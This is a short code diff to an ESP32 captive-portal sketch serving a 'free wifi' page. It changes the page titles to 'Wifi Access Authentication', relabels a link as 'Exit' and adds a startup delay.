@@ -19,7 +19,7 @@ const char* htmlPage = R"=====(
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ESP32 Captive Portal</title>
+  <title>Wifi Access Authentication</title>
   <style>
     * {
       box-sizing: border-box;
@@ -102,7 +102,7 @@ const char *thankYouPage = R"=====(
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Thank You</title>
+  <title>Wifi Access Authentication</title>
   <style>
     * {
       box-sizing: border-box;
@@ -153,7 +153,7 @@ const char *thankYouPage = R"=====(
   <div class="container">
     <h2>Thank You for connecting!</h2>
     <p>Enjoy the free wifi.</p>
-    <a href="/">Go Back to Home</a>
+    <a href="/">Exit</a>
   </div>
 </body>
 </html>
@@ -164,6 +164,8 @@ DNSServer dnsserver;
 
 
 void setup() {
+  delay(3000);
+
   Serial.begin(115200);
   Serial.println();
   Serial.println("Configuring wifi access point.....");
